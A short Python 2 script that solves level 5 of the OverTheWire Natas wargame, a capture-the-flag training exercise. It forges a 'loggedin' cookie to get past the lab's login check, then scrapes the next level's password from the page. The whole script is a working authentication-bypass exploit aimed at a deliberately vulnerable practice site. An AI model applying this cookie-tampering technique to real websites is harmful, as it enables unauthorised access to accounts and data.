
#!/usr/bin/python
# coding: utf-8
from requests.auth import HTTPBasicAuth
import requests
import sys
import re

def exploit(level5pass):
    print "{+} Natas Level 5. Doing magic..."
    try:
        cookie = {"loggedin": "1"}
        r = requests.get(url="http://natas5.natas.labs.overthewire.org/", cookies=cookie, auth=HTTPBasicAuth('natas5', level5pass))
    except Exception:
        print "{-} Something fucked up, request failed. Bailing. Maybe your password was wrong?"
        return None
    password = re.findall("natas6 is (.*?)<", r.text)
    if len(password):
        return password[0]
    return None

def main(args):
    if len(args) != 2:
        sys.exit("use: %s level5password" %(args[0]))
    level6pass = exploit(args[1])
    if level6pass != None:
        print "{$$} Level 6 Password is: %s" %(level6pass)

if __name__ == "__main__":
    main(args=sys.argv)
